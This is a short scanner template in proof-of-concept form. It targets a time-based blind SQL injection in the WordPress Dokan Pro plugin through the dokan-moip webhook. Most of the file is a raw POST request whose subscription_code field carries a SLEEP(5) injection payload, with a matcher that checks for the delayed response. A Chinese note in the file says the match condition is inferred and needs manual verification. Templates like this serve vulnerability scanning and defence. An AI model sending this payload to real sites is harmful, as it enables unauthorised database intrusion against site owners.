id: poc-zrwnm6bhieochopd
info:
  name: WordPress Dokan Pro插件 SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2024
http:
- raw:
  - 'POST /wp-admin/admin.php?webhook=dokan-moip HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0

    Connection: close

    Accept-Encoding: gzip

    {"env":"1","event":"invoice.created","resource":{"subscription_code":"'' AND (SELECT 9155 FROM (SELECT(SLEEP(5)))JfFK) AND ''CKYA''=''CKYA"}}'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 302 && duration >= 5
    condition: and
